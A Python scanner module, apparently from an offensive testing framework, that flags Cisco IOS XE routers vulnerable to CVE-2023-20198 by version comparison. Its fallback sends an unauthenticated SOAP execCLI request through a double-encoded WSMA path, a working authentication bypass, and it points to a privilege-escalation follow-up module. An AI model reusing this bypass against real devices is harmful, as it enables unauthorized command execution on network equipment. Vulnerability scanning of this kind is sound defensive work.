#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_WEBUI_PATH = "/webui/"
_LOGOUT_TOKEN_PATH = "/webui/logoutconfirm.html?logon_hash=1"
_WSMA_PATH = "/%2577eb%2575i_%2577sma_Http"
_TOKEN_RE = re.compile(r"[a-f0-9]{18}", re.I)

# First fixed release per IOS XE train (Cisco advisory)
_FIXED_BY_TRAIN = {
    (17, 9): (17, 9, 4, 1),   # 17.9.4a
    (17, 6): (17, 6, 6, 1),   # 17.6.6a
    (17, 3): (17, 3, 8, 1),   # 17.3.8a
    (16, 12): (16, 12, 10, 1),  # 16.12.10a
}


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Cisco IOS XE CVE-2023-20198 detection",
        "description": (
            "Detects Cisco IOS XE Web UI and flags CVE-2023-20198 by comparing the "
            "advertised IOS XE version against Cisco fixed releases. Falls back to "
            "a WSMA show version probe only when the version cannot be read from the "
            "Web UI page."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2023-20198",
        "references": [
            "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-20198",
        ],
        "modules": [
            "auxiliary/admin/http/cisco_ios_xe_cve_2023_20198_priv_esc",
        ],
        "tags": [
            "web",
            "scanner",
            "cisco",
            "ios-xe",
            "router",
            "cve-2023-20198",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "cost": 1.0,
            "noise": 0.1,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["cisco", "ios-xe", "ios xe"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/webui/"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "ios_xe_wsma"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/admin/http/cisco_ios_xe_cve_2023_20198_priv_esc",
                ],
            },
        },
    }

    port = OptPort(80, "Target HTTP port", required=True)
    ssl = OptBool(False, "Use HTTPS", required=True, advanced=True)

    _VERSION_PATTERNS = (
        re.compile(r"IOS[- ]XE Software, Version\s+([\d.]+[a-z]?)", re.I),
        re.compile(r"Cisco IOS XE Software, Version\s+([\d.]+[a-z]?)", re.I),
        re.compile(r"ios[-_]?xe[^0-9]{0,16}([\d]+\.[\d]+\.[\d]+[a-z]?)", re.I),
    )

    def _timeout(self) -> int:
        return max(int(self.timeout or 10), 10)

    @staticmethod
    def _version_key(value: str) -> Optional[Tuple[int, int, int, int]]:
        match = re.match(r"(\d+)\.(\d+)\.(\d+)([a-z]?)", str(value or "").strip(), re.I)
        if not match:
            return None
        suffix = match.group(4).lower()
        suffix_rank = (ord(suffix) - ord("a") + 1) if suffix else 0
        return (
            int(match.group(1)),
            int(match.group(2)),
            int(match.group(3)),
            suffix_rank,
        )

    def _extract_version(self, text: str) -> str:
        for pattern in self._VERSION_PATTERNS:
            match = pattern.search(text or "")
            if match:
                return match.group(1).strip()
        return ""

    def _is_ios_xe(self, text: str) -> bool:
        lowered = (text or "").lower()
        return "ios xe" in lowered or "ios-xe" in lowered or "/webui/" in lowered

    def _version_status(self, version: str) -> Optional[str]:
        """Return 'vulnerable', 'patched', or None if train is unknown."""
        key = self._version_key(version)
        if not key:
            return None
        fixed = _FIXED_BY_TRAIN.get((key[0], key[1]))
        if not fixed:
            return None
        if key < fixed:
            return "vulnerable"
        return "patched"

    def _report(self, version: str, source: str) -> bool:
        status = self._version_status(version)
        if status == "vulnerable":
            self.set_info(
                severity="critical",
                reason=(
                    f"IOS XE {version} ({source}) is below the fixed release "
                    f"for train {version.rsplit('.', 1)[0]}.x (CVE-2023-20198)"
                ),
                version=version,
            )
            return True
        if status == "patched":
            self.set_info(
                severity="info",
                reason=f"IOS XE {version} ({source}) appears patched for CVE-2023-20198",
                version=version,
            )
            return False
        self.set_info(
            severity="info",
            reason=(
                f"IOS XE {version} ({source}) detected; release train not mapped "
                "to Cisco fixed releases"
            ),
            version=version,
        )
        return True

    def _retrieve_token(self) -> Optional[str]:
        response = self.http_request(
            method="POST",
            path=_LOGOUT_TOKEN_PATH,
            allow_redirects=False,
            timeout=self._timeout(),
        )
        if not response:
            return None
        match = _TOKEN_RE.search(response.text or "")
        return match.group(0) if match else None

    def _wsma_show_version(self, token: str) -> str:
        soap = (
            '<?xml version="1.0"?>'
            '<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/">'
            "<SOAP:Header>"
            '<wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">'
            "<wsse:UsernameToken>"
            "<wsse:Username>admin</wsse:Username>"
            "<wsse:Password>x</wsse:Password>"
            "</wsse:UsernameToken>"
            "</wsse:Security>"
            "</SOAP:Header>"
            "<SOAP:Body>"
            '<request correlator="scan" xmlns="urn:cisco:wsma-exec">'
            '<execCLI xsd="false"><cmd>show version</cmd></execCLI>'
            "</request>"
            "</SOAP:Body>"
            "</SOAP:Envelope>"
        )
        response = self.http_request(
            method="POST",
            path=_WSMA_PATH,
            data=soap,
            headers={
                "Content-Type": "text/xml;charset=UTF-8",
                "Authorization": token,
            },
            allow_redirects=False,
            timeout=self._timeout(),
        )
        if not response:
            return ""
        body = response.text or ""
        if "cisco ios" in body.lower() or "version " in body.lower():
            return body
        return ""

    def run(self):
        response = self.http_request(
            method="GET",
            path=_WEBUI_PATH,
            allow_redirects=True,
            timeout=self._timeout(),
        )
        if not response:
            return False

        body = response.text or ""
        if not self._is_ios_xe(body):
            print_error("Cisco IOS XE Web UI not detected")
            return False

        version = self._extract_version(body)
        if version:
            return self._report(version, "Web UI")

        print_status("Version not exposed in Web UI, falling back to WSMA probe")
        token = self._retrieve_token()
        if not token:
            self.set_info(
                severity="info",
                reason="IOS XE Web UI detected but version could not be determined",
            )
            return True

        wsma_body = self._wsma_show_version(token)
        version = self._extract_version(wsma_body)
        if version:
            return self._report(version, "WSMA")

        if wsma_body:
            self.set_info(
                severity="critical",
                reason="CVE-2023-20198: unauthenticated WSMA execCLI confirmed (version unknown)",
            )
            return True

        self.set_info(
            severity="medium",
            reason="IOS XE Web UI with WSMA token exposed; exploitability not confirmed",
        )
        return True
